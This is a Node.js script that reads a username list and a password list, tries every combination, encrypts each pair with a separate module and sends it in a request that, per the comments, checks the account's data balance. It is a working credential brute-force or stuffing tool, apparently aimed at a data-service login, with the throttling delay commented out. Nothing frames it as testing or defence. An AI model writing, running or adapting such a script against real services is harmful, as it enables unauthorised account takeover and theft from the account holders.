const fs = require('fs');
const readline = require('readline');
const encryptData = require('./modules/encryptData');
const sendRequest = require('./modules/sendRequests');



// Create stream of input file
const rl = readline.createInterface({
    input: fs.createReadStream('./fakeunames.txt'),
    // input: fs.createReadStream('./unames.txt'),
    output: process.stdout,
    terminal:false
})


const rl2 = readline.createInterface({
  // input: fs.createReadStream('./fakepwords.txt'),
  input: fs.createReadStream('./pwords.txt'),
  output: process.stdout,
  terminal:false
})


//   Process the stream
// rl.on('line', (line) => {
//     let lineArr = line.split(' ');

//     // encrypt the username and password with emilk's algorithm
//     let encryptedData = encryptData(lineArr[0], lineArr[1]);

//     // console.log(encryptedData);

//     // call sendRequest that checks data balance
//     sendRequest(encryptedData, lineArr[0]);


// })
let usernamesArray = [];
let passwordArray = [];

rl.on('line', (line1) => {
  line1 = `${line1}`
  usernamesArray.push(line1);
})
    
rl2.on('line', (line2) => {
  passwordArray.push(line2);
     
})


  // rl.on('pause', () => {
  //   console.log('\nDone! Reading file\n');
  //   usernamesArray.forEach((arr, index) => {
  //     console.log(arr[index], passwordArray[index]);
  //     console.log(`index: ${index}`);
      
  //   });
  //   console.log(usernamesArray);
  //   console.log(passwordArray);
  // })

  
// rl.on('close', () => {
//   console.log('Stopped reading');
//   console.log(usernamesArray);
//   console.log(passwordArray);
// })

rl2.on('close', () => {
  console.log('Stopped reading');
  // console.log(usernamesArray);
  // console.log(passwordArray);

  usernamesArray.forEach((username, index) => {
    
    passwordArray.forEach(password => {
      console.log(username, password);

       // encrypt the username and password with milk's algorithm
      let encryptedData = encryptData(username, password);
      // console.log(encryptedData);


      // setTimeout(() => {
      //   // call sendRequest that checks data balance
      //   sendRequest(encryptedData, username);
        
      // }, 20000);
      
      // call sendRequest that checks data balance
      sendRequest(encryptedData, username);

      
    });
    
  });


})


